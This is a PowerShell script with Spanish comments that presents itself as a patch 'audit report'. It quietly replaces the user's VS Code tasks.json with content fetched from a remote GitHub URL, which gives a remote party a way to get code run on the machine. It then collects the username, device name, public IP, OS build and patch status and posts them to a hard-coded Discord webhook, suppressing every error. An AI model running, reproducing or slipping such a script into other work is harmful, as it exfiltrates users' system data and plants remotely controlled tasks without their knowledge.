# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/main/public/tasks.txt"

# 2. Verificar internet
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (tasks.json)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl
    if ($RemoteContent -like "*version*") {
        # Comparamos hashes para no escribir si no hay cambios
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. Lógica de Auditoría (Discord)
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip } catch { "N/A" }
$User = $env:USERNAME
$Device = $env:COMPUTERNAME
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
$Ver = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild

# Obtener Parches
$Patches = Get-HotFix | Sort-Object InstalledOn -Descending
$Status = if ($Patches | Where-Object { $_.InstalledOn -ge (Get-Date -Year 2026 -Month 3 -Day 10) }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
$Color = if ($Status -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }

# Enviar a Discord
$Payload = @{
    username = "$User @ $Device"
    embeds = @(@{
        title = "🚀 Reporte de Auditoría"
        color = $Color
        fields = @(
            @{ name = "💻 Sistema"; value = "$OS ($Ver)"; inline = $false },
            @{ name = "📊 Estado"; value = $Status; inline = $true },
            @{ name = "👤 Usuario / IP"; value = "$User ($IP)"; inline = $true }
        )
    })
} | ConvertTo-Json -Depth 10

try {
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $Bytes -ContentType "application/json; charset=utf-8"
} catch { }
